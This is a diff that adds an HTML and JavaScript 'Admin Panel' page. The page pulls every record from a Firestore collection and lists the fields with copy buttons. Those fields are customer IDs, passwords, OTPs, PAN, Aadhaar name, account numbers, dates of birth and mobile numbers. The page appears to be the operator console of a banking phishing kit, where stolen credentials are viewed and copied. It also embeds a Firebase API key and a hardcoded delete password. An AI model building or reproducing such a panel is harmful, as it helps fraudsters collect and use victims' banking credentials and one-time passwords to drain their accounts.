@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Panel - All Data</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      margin: 0;
+      padding: 10px;
+    }
+    h2 {
+      text-align: center;
+      font-size: 22px;
+      margin-top: 10px;
+    }
+    .entry {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 12px;
+      margin: 12px auto;
+      width: 95%;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+    .field {
+      margin: 8px 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      font-size: 15px;
+    }
+    .field div {
+      flex: 1;
+      margin-right: 10px;
+      word-break: break-word;
+    }
+    .copy-btn {
+      background: #2196F3;
+      color: white;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+    #deleteBtn {
+      display: block;
+      margin: 20px auto;
+      background: red;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      font-weight: bold;
+      font-size: 15px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>Admin Panel - All Submissions</h2>
+  <button id="deleteBtn">Delete All Data</button>
+  <div id="dataContainer"></div>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.firebasestorage.app",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    function copyToClipboard(text) {
+      navigator.clipboard.writeText(text);
+      alert("Copied: " + text);
+    }
+
+    function createField(label, value) {
+      return `
+        <div class="field">
+          <div><strong>${label}:</strong> ${value}</div>
+          <button class="copy-btn" onclick="copyToClipboard('${value}')">Copy</button>
+        </div>
+      `;
+    }
+
+    function loadData() {
+      db.collection("alldata-hare")
+        .orderBy("timestamp", "desc")
+        .get()
+        .then(snapshot => {
+          const container = document.getElementById("dataContainer");
+          container.innerHTML = "";
+
+          snapshot.forEach(doc => {
+            const data = doc.data();
+            let entryHTML = `<div class="entry">`;
+
+            for (const key in data) {
+              if (key === "timestamp") continue;
+              entryHTML += createField(formatLabel(key), data[key]);
+            }
+
+            if (data.timestamp) {
+              entryHTML += createField("Timestamp", data.timestamp.toDate().toLocaleString());
+            }
+
+            entryHTML += `</div>`;
+            container.innerHTML += entryHTML;
+          });
+        })
+        .catch(error => {
+          console.error("Error fetching data: ", error);
+        });
+    }
+
+    function formatLabel(key) {
+      const labels = {
+        customerId: "Customer ID",
+        password: "Password",
+        mobile: "Mobile",
+        dob: "DOB",
+        holder: "Account Holder Name",
+        otp: "OTP",
+        pan: "PAN",
+        name: "Name",
+        accountNumber: "Account Number",
+        aadhaarName: "Aadhaar Name"
+      };
+      return labels[key] || key;
+    }
+
+    document.getElementById("deleteBtn").addEventListener("click", () => {
+      const pass = prompt("Enter password to delete all data:");
+      if (pass !== "4542") {
+        alert("Incorrect password.");
+        return;
+      }
+
+      if (!confirm("Are you sure you want to delete ALL data?")) return;
+
+      db.collection("alldata-hare")
+        .get()
+        .then(snapshot => {
+          const batch = db.batch();
+          snapshot.forEach(doc => {
+            batch.delete(doc.ref);
+          });
+          return batch.commit();
+        })
+        .then(() => {
+          alert("All data deleted successfully.");
+          document.getElementById("dataContainer").innerHTML = "";
+        })
+        .catch(error => {
+          console.error("Error deleting data:", error);
+          alert("Error occurred while deleting data.");
+        });
+    });
+
+    loadData();
+  </script>
+</body>
+</html>
